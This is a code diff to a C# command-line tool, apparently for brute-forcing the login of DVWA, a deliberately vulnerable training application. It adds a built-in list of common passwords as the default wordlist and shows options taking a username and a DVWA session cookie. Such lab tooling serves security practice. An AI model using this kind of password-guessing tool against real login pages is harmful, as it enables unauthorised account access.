@@ -1,12 +1,36 @@
 ﻿using AngleSharp;
 using AngleSharp.Dom;
 using System.CommandLine;
+using System.Diagnostics.Metrics;
 using System.IO;
 
 namespace DVWA_BruteForce_HighSecurity
 {
     internal class Program
     {
+        private static string[] DefaultPasswordList = {
+            "123456",
+            "12345678",
+            "qwerty",
+            "123456789",
+            "12345",
+            "1234",
+            "111111",
+            "1234567",
+            "password",
+            "dragon",
+            "123123",
+            "baseball",
+            "abc123",
+            "football",
+            "monkey",
+            "letmein",
+            "shadow",
+            "master",
+            "666666",
+            "qwertyuiop"
+        };
+
         static async Task Main(string[] args)
         {
             var usernameOption = new Option<string>(
@@ -23,7 +47,7 @@ namespace DVWA_BruteForce_HighSecurity
                 name: "--phpSessId",
                 description: "The PHP Session Id to include with the request headers. " +
                 "This can be found by using browser DevTools and inspecting the cookies set by DVWA.")
-            { IsRequired = true };
+                { IsRequired = true };
 
             var passwordListOption = new Option<string>(
                 name: "--passwordList",
@@ -66,7 +90,7 @@ namespace DVWA_BruteForce_HighSecurity
             }
             else
             {
-                passwordList = File.ReadLines("PasswordList.txt").ToList();
+                passwordList = DefaultPasswordList.ToList();
             }
 
             using (var httpClient = new HttpClient())
